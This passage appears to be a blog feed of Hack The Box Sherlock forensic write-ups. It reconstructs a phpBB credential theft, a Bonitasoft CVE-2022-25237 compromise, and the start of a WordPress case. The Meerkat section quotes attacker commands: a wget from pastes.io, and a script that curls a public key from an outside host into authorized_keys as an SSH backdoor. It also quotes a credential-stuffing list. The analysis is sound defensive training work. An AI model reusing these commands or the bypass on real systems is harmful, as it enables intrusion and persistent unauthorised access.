</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>26/Apr/2023:11:54:22 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup&amp;action=download HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">2463</span> <span style="color:#f1fa8c">&#34;http://10.10.0.27/adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&amp;i=acp_database&amp;mode=backup&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&#34;</span>
</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>26/Apr/2023:11:54:24 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET /adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">3771</span> <span style="color:#f1fa8c">&#34;http://10.10.0.27/adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup&amp;action=download&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&#34;</span>
</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>26/Apr/2023:11:54:30 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup&amp;action=download HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">2474</span> <span style="color:#f1fa8c">&#34;http://10.10.0.27/adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&#34;</span>
</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>26/Apr/2023:11:56:28 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET /adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">3770</span> <span style="color:#f1fa8c">&#34;http://10.10.0.27/adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup&amp;action=download&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&#34;</span>
</span></span></code></pre></div><p>And finally they downloaded the database backup.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat access.log | egrep -v <span style="color:#f1fa8c">&#34;/(assets|style|images)&#34;</span> | egrep -i 10.10.0.78 | grep .sql
</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>26/Apr/2023:12:01:38 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET /store/backup_1682506471_dcsr71p7fyijoyq8.sql.gz HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">34707</span> <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&#34;</span>
</span></span></code></pre></div><p>The database backup file size was <code>34707</code> bytes (34.7 KB) in size.</p>
<h3 id="summary">Summary</h3>
<p>The contractor used his account to stage a phishing page in the internal forum of Forela. Then he stole the Administrator&rsquo;s credential using the phishing page and exfiltrated the data using a credential stealer (httx://10.10.0.78/update.php) hosted on the IP <code>10.10.0.78</code>. Then, they used the stolen Administrator credential created an account (apoole) for persistence. Then they backed up and downloaded the database.</p>
]]></description></item><item><title>HTB Sherlock Meerkat</title><link>https://hshakilst.github.io/posts/htb-sherlocks/meerkat/</link><pubDate>Wed, 12 Jun 2024 04:45:17 -0400</pubDate><guid>https://hshakilst.github.io/posts/htb-sherlocks/meerkat/</guid><description><![CDATA[<h1 id="meerkat---soc">Meerkat - SOC</h1>
<h3 id="scenario">Scenario</h3>
<p>As a fast-growing startup, Forela has been utilising a business management platform. Unfortunately, our documentation is scarce, and our administrators aren&rsquo;t the most security aware. As our new security provider we&rsquo;d like you to have a look at some PCAP and log data we have exported to confirm if we have (or have not) been compromised.</p>
<h3 id="artifacts">Artifacts</h3>
<table>
<thead>
<tr>
<th>Artifact</th>
<th>MD5 Hash</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>meerkat.zip</td>
<td>9b8369a0fcd7f95889c28da597951ad3</td>
<td>hacktheblue</td>
</tr>
<tr>
<td>meerkat-alerts.json</td>
<td>f9642326d526c4f5159470b1c5d89b4a</td>
<td>n/a</td>
</tr>
<tr>
<td>meerkat.pcap</td>
<td>7ac62b1e835e0850104f1fc2ecf1f002</td>
<td>n/a</td>
</tr>
</tbody>
</table>
<h3 id="tools-used">Tools Used</h3>
<ul>
<li><code>jq</code> JSON parser - Analyzing the JSON file.</li>
<li>WireShark - Analyzing the PCAP file.</li>
</ul>
<h3 id="forensic-analysis">Forensic Analysis</h3>
<p><strong>Using <code>jq</code> I quickly searched for alerts with severity level 1.</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>$ cat meerkat-alerts.json| jq &#39;.[] | select(.alert.severity==<span style="color:#bd93f9">1</span>)&#39; | less
</span></span><span style="display:flex;"><span>&lt;--snip--&gt;
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;ts&#34;</span>: <span style="color:#f1fa8c">&#34;2023-01-19T15:31:31.042Z&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;event_type&#34;</span>: <span style="color:#f1fa8c">&#34;alert&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;src_ip&#34;</span>: <span style="color:#f1fa8c">&#34;156.146.62.213&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;src_port&#34;</span>: <span style="color:#bd93f9">53196</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;dest_ip&#34;</span>: <span style="color:#f1fa8c">&#34;172.31.6.44&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;dest_port&#34;</span>: <span style="color:#bd93f9">8080</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;vlan&#34;</span>: <span style="color:#ff79c6">null</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;proto&#34;</span>: <span style="color:#f1fa8c">&#34;TCP&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;app_proto&#34;</span>: <span style="color:#f1fa8c">&#34;http&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;alert&#34;</span>: {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;severity&#34;</span>: <span style="color:#bd93f9">1</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;signature&#34;</span>: <span style="color:#f1fa8c">&#34;ET WEB_SPECIFIC_APPS Bonitasoft Default User Login Attempt M1 (Possible Staging for CVE-2022-25237)&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;category&#34;</span>: <span style="color:#f1fa8c">&#34;Attempted Administrator Privilege Gain&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;action&#34;</span>: <span style="color:#f1fa8c">&#34;allowed&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;signature_id&#34;</span>: <span style="color:#bd93f9">2036815</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;gid&#34;</span>: <span style="color:#bd93f9">1</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;rev&#34;</span>: <span style="color:#bd93f9">1</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;metadata&#34;</span>: {
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;signature_severity&#34;</span>: [
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;Minor&#34;</span>
</span></span><span style="display:flex;"><span>      ],
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;former_category&#34;</span>: [
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;WEB_SPECIFIC_APPS&#34;</span>
</span></span><span style="display:flex;"><span>      ],
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;attack_target&#34;</span>: [
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;Server&#34;</span>
</span></span><span style="display:flex;"><span>      ],
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;deployment&#34;</span>: [
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;SSLDecrypt&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;Perimeter&#34;</span>
</span></span><span style="display:flex;"><span>      ],
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;affected_product&#34;</span>: <span style="color:#ff79c6">null</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;created_at&#34;</span>: [
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;2022_06_03&#34;</span>
</span></span><span style="display:flex;"><span>      ],
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;performance_impact&#34;</span>: [
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;Low&#34;</span>
</span></span><span style="display:flex;"><span>      ],
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;updated_at&#34;</span>: [
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;2022_06_03&#34;</span>
</span></span><span style="display:flex;"><span>      ],
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;malware_family&#34;</span>: <span style="color:#ff79c6">null</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;tag&#34;</span>: <span style="color:#ff79c6">null</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&#34;cve&#34;</span>: [
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;CVE_2022_25237&#34;</span>
</span></span><span style="display:flex;"><span>      ]
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  },
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;flow_id&#34;</span>: <span style="color:#bd93f9">1652763046938834</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;pcap_cnt&#34;</span>: <span style="color:#bd93f9">2168</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;tx_id&#34;</span>: <span style="color:#bd93f9">0</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;icmp_code&#34;</span>: <span style="color:#ff79c6">null</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;icmp_type&#34;</span>: <span style="color:#ff79c6">null</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;tunnel&#34;</span>: <span style="color:#ff79c6">null</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;community_id&#34;</span>: <span style="color:#f1fa8c">&#34;1:0XAwrtog1jdopmX+yd1WRDEzMAc=&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Looks like a TA was brute forcing the default credentials for Bonitasoft to exploit the CVE-2022-25237. I confirmed the credential stuffing attack by analyzing the PCAP file.</p>
<p><strong>PCAP Analysis Using WireShark</strong>
<img src="images/20240612174728.png" alt="alt text"></p>
<p>Analyzing the PCAP file it was confirmed that the TA successfully gained access to an account with the credential <code>seb.broom@forela.co.uk:g0vernm3nt</code>. And then gained privileged access to the Web Application&rsquo;s REST API by exploiting CVE-2022-25237. After getting privileged access to the Bonita web service the TA uploaded a malicious API extension to get command execution on the web application server.
<img src="images/20240612175559.png" alt="alt text"></p>
<p>The TA successfully gained command execution on the server.
<img src="images/20240612181452.png" alt="alt text">
<img src="images/20240612181529.png" alt="alt text"></p>
<p><strong>CVE-2022-25237</strong>
According to <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-25237">NIST</a>, <em>Bonita Web 2021.2 is affected by a authentication/authorization bypass vulnerability due to an overly broad exclude pattern used in the RestAPIAuthorizationFilter. By appending ;i18ntranslation or /../i18ntranslation/ to the end of a URL, users with no privileges can access privileged API endpoints. This can lead to remote code execution by abusing the privileged API actions.</em></p>
<p>HTTP Object Extraction:
<img src="images/20240612180604.png" alt="alt text"></p>
<p>After discovering this incident I extracted all the HTTP TCP stream objects from the PCAP file and found the usernames and passwords combination list used in this security incident.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>user,password
</span></span><span style="display:flex;"><span>Clerc.Killich%40forela.co.uk,vYdwoVhGIwJ
</span></span><span style="display:flex;"><span>Lauren.Pirozzi%40forela.co.uk,wsp0Uy
</span></span><span style="display:flex;"><span>Merna.Rammell%40forela.co.uk,u7pWoF36fn
</span></span><span style="display:flex;"><span>Gianina.Tampling%40forela.co.uk,maUIffqQl
</span></span><span style="display:flex;"><span>Konstance.Domaschke%40forela.co.uk,6XLZjvD
</span></span><span style="display:flex;"><span>Vida.Murty%40forela.co.uk,4ulecG
</span></span><span style="display:flex;"><span>Elka.Cavet%40forela.co.uk,n1aSdc
</span></span><span style="display:flex;"><span>Noam.Harvett%40forela.co.uk,VDt8bh
</span></span><span style="display:flex;"><span>Norbie.Bartolini%40forela.co.uk,GV2zlop
</span></span><span style="display:flex;"><span>Cariotta.Whife%40forela.co.uk,x3hoU0
</span></span><span style="display:flex;"><span>Mella.Amsberger%40forela.co.uk,4nIYM5WqN
</span></span><span style="display:flex;"><span>Cyndy.Element%40forela.co.uk,ybWxct
</span></span><span style="display:flex;"><span>Imelda.Braben%40forela.co.uk,dC7bjGLYB
</span></span><span style="display:flex;"><span>Marven.Samuel%40forela.co.uk,LPU0qQnt108
</span></span><span style="display:flex;"><span>Osborne.Humpatch%40forela.co.uk,OJ4WHcI4D
</span></span><span style="display:flex;"><span>Talya.Sterman%40forela.co.uk,3gCERZ2JMh
</span></span><span style="display:flex;"><span>Drusilla.Nice%40forela.co.uk,l35Euh0T3Am
</span></span><span style="display:flex;"><span>Tobiah.Horstead%40forela.co.uk,fp0OQl
</span></span><span style="display:flex;"><span>Kayley.Northway%40forela.co.uk,s9MC7mkdVU
</span></span><span style="display:flex;"><span>Adora.Mersh%40forela.co.uk,85Hh8JZkJR6
</span></span><span style="display:flex;"><span>Guss.Botten%40forela.co.uk,sVMRgGmv0sE
</span></span><span style="display:flex;"><span>Cordelie.Rostron%40forela.co.uk,mAtdcJh
</span></span><span style="display:flex;"><span>Ellerey.Bierling%40forela.co.uk,Nva0nKTz
</span></span><span style="display:flex;"><span>Berny.Ferrarin%40forela.co.uk,lPCO6Z
</span></span><span style="display:flex;"><span>Nefen.Heffernon%40forela.co.uk,VR0ZA8
</span></span><span style="display:flex;"><span>Skipton.Pickerill%40forela.co.uk,lcsui1Nu
</span></span><span style="display:flex;"><span>Nola.Crichmer%40forela.co.uk,QGa58W3L
</span></span><span style="display:flex;"><span>Sharon.Claus%40forela.co.uk,3X4d06I
</span></span><span style="display:flex;"><span>Bernelle.Draycott%40forela.co.uk,MmxlUAWe0oW
</span></span><span style="display:flex;"><span>Samaria.Percifull%40forela.co.uk,CUgc3hzHw5g
</span></span><span style="display:flex;"><span>Puff.Yapp%40forela.co.uk,M08Aae
</span></span><span style="display:flex;"><span>Cynthia.Hatto%40forela.co.uk,z0NXI6
</span></span><span style="display:flex;"><span>seb.broom%40forela.co.uk,g0vernm3nt
</span></span><span style="display:flex;"><span>Alexi.Siman%40forela.co.uk,iUS11pX
</span></span><span style="display:flex;"><span>Pete.Panons%40forela.co.uk,BKdkGTB
</span></span><span style="display:flex;"><span>Rakel.Cawley%40forela.co.uk,h4gW3YLwnW9t
</span></span><span style="display:flex;"><span>Merl.Lavalde%40forela.co.uk,BgfiOVXNLBc
</span></span><span style="display:flex;"><span>Antoinette.Vittel%40forela.co.uk,bGtHL8cg
</span></span><span style="display:flex;"><span>Stanleigh.Tuckwell%40forela.co.uk,VQCk8TGn3
</span></span><span style="display:flex;"><span>Denny.Gepson%40forela.co.uk,q2JqCSXk69
</span></span><span style="display:flex;"><span>Aline.Rivallant%40forela.co.uk,gFixyf1nGgf
</span></span><span style="display:flex;"><span>Jordain.Eykel%40forela.co.uk,rnMXBNdNW0
</span></span><span style="display:flex;"><span>Gypsy.Henric%40forela.co.uk,lLPqVgmHs5F
</span></span><span style="display:flex;"><span>Adrea.Shervil%40forela.co.uk,7YoFhtUq
</span></span><span style="display:flex;"><span>Jenilee.Pressman%40forela.co.uk,3eYwLOKhQEcl
</span></span><span style="display:flex;"><span>Fredrick.Gerraty%40forela.co.uk,W1By0HUByDHO
</span></span><span style="display:flex;"><span>Ebony.Oleszcuk%40forela.co.uk,uAWnyfKOjQM
</span></span><span style="display:flex;"><span>Garrard.Colisbe%40forela.co.uk,jMi9iP
</span></span><span style="display:flex;"><span>Farleigh.Schouthede%40forela.co.uk,JzI6Dvhy
</span></span><span style="display:flex;"><span>Ahmed.Monteaux%40forela.co.uk,6uskrtw8U
</span></span><span style="display:flex;"><span>Griffith.Lumm%40forela.co.uk,QPepd0M8wBK
</span></span><span style="display:flex;"><span>Winston.Conville%40forela.co.uk,cEmh5W2Vh
</span></span><span style="display:flex;"><span>Pat.Kloisner%40forela.co.uk,N8ZwVMzF6
</span></span><span style="display:flex;"><span>Teresita.Benford%40forela.co.uk,uvYjtQzX
</span></span><span style="display:flex;"><span>Mathian.Skidmore%40forela.co.uk,TQSNp6XrK
</span></span><span style="display:flex;"><span>Gerri.Cordy%40forela.co.uk,w15pvWGTK
</span></span></code></pre></div><p>I also found an interesting file named <code>bx5gcr0et8</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#ff79c6">&#34;p&#34;</span>:<span style="color:#f1fa8c">&#34;0&#34;</span>,<span style="color:#ff79c6">&#34;c&#34;</span>:<span style="color:#f1fa8c">&#34;1&#34;</span>,<span style="color:#ff79c6">&#34;cmd&#34;</span>:<span style="color:#f1fa8c">&#34;wget https://pastes.io/raw/bx5gcr0et8&#34;</span>,<span style="color:#ff79c6">&#34;out&#34;</span>:<span style="color:#f1fa8c">&#34;--2023-01-19 15:38:52--  https://pastes.io/raw/bx5gcr0et8\nResolving pastes.io (pastes.io)... 66.29.132.145\nConnecting to pastes.io (pastes.io)|66.29.132.145|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 113 [text/plain]\nSaving to: \u2018bx5gcr0et8\u2019\n\n     0K                                                       100% 57.8M=0s\n\n2023-01-19 15:38:53 (57.8 MB/s) - \u2018bx5gcr0et8\u2019 saved [113/113]\n\n&#34;</span>,<span style="color:#ff79c6">&#34;currentDate&#34;</span>:<span style="color:#f1fa8c">&#34;2023-01-19&#34;</span>}
</span></span></code></pre></div><p>A command was issued to download the file from <code>pastes.io</code>.
<img src="images/20240612181638.png" alt="alt text"></p>
<p>And then another command was issued to run the <code>bx5gcr0et8</code> file which was a bash script.
<img src="images/20240612181813.png" alt="alt text"></p>
<p>The contents of the bash script <code>bx5gcr0et8</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>**#!/bin/bash
</span></span><span style="display:flex;"><span>curl https://pastes.io/raw/hffgra4unv &gt;&gt; /home/ubuntu/.ssh/authorized_keys
</span></span><span style="display:flex;"><span>sudo service ssh restart**
</span></span></code></pre></div><p>A persistence technique identified by MITRE with a technique ID <a href="https://attack.mitre.org/techniques/T1098/004/">T1098.004</a>. Basically, the adversary used a public key and inserted in into the <code>/home/ubuntu/.ssh/authorized_keys</code> file. In this technique the TA can also set the derivative <code>PubkeyAuthentication</code> set to <code>yes</code> in the <code>/etc/ssh/sshd_config</code> file. And, also can modify the <code>sshd_config</code> file further and set the <code>RSAAuthentication</code> to the value <code>yes</code>, if the public key algorithm is RSA based.</p>
<p>The Public Key used by the TA:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgruRMq3DMroGXrcPeeuEqQq3iS/sAL3gryt+nUqbBA/M+KG4ElCvJS4gP2os1b8FMk3ZwvrVTdpEKW6wdGqPl2wxznBjOBstx6OF2yp9RIOb3c/ezgs9zvnaO07YC8Sm4nkkXHgkabqcM7rHEY4Lay0LWF9UbxueSAHIJgQ2ADbKSnlg0gMnJTNRwKbqesk0ZcG3b6icj6nkKykezBLvWc7z4mkSm28ZVTa15W3HUWSEWRbGgJ6eMBdi7WnWXZ92SYDq0XUBV2Sx2gjoDGHwcd6I0q9BU52wWYo3L3LaPEoTcLuA+hnn82086oUzJfmEUtWGlPAXfJBN7vRIMSvsN
</span></span></code></pre></div><h3 id="summary">Summary</h3>
<p>The threat actors used credential stuffing attack against the Bonita Service and escalated their privileges in the web application by exploiting CVE-2022-25237. After that to get remote code execution on the server the threat actors uploaded a malicious extension file which gave them command injection ability. Then, they used this ability to get information of the users and added a SSH backdoor to the <code>ubuntu</code> user account for persistence.</p>
]]></description></item><item><title>HTB Sherlock Ultimatum</title><link>https://hshakilst.github.io/posts/htb-sherlocks/ultimatum/</link><pubDate>Mon, 27 May 2024 13:25:02 +0200</pubDate><guid>https://hshakilst.github.io/posts/htb-sherlocks/ultimatum/</guid><description><![CDATA[<h1 id="ultimatum-dfirhttpsapphacktheboxcomsherlocksultimatum"><a href="https://app.hackthebox.com/sherlocks/Ultimatum">Ultimatum (DFIR)</a></h1>
<h2 id="scenario">Scenario</h2>
<p>One of the Forela WordPress servers was a target of notorious Threat Actors (TA). The website was running a blog dedicated to the Forela Social Club, where Forela employees can chat and discuss random topics. Unfortunately, it became a target of a threat group. The SOC team believes this was due to the blog running a vulnerable plugin. The IT admin already followed the acquisition playbook and triaged the server for the security team. Ultimately (no pun intended) it is your responsibility to investigate the incident. Step in and confirm the culprits behind the attack and restore this important service within the Forela environment.</p>
<h2 id="forensics">Forensics</h2>
<h3 id="artifacts">Artifacts</h3>
<p>We are given an archive <code>ultimatum.zip</code> with a <code>sha256sum:101ae8258f9a2a821bdc78e4f2b61deb2337cffb95e58c4dfe8cd4e57ca75a66</code>.</p>
<p>Upon extracting the archive use <a href="https://github.com/WithSecureLabs/LinuxCatScale/blob/master/Extract-Cat-Scale.sh">Extract-Cat-Scale.sh</a> we get the following artifacts:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">1732</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>console<span style="color:#ff79c6">-</span>error<span style="color:#ff79c6">-</span><span style="color:#8be9fd;font-style:italic">log</span><span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Docker:
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Logs:
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">488</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">451801</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>last<span style="color:#ff79c6">-</span>btmp<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">329</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>last<span style="color:#ff79c6">-</span>utmp<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">606</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>last<span style="color:#ff79c6">-</span>utmpdump<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">732</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>last<span style="color:#ff79c6">-</span>wtmp<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">2397</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>lastlog<span style="color:#ff79c6">.</span>txt
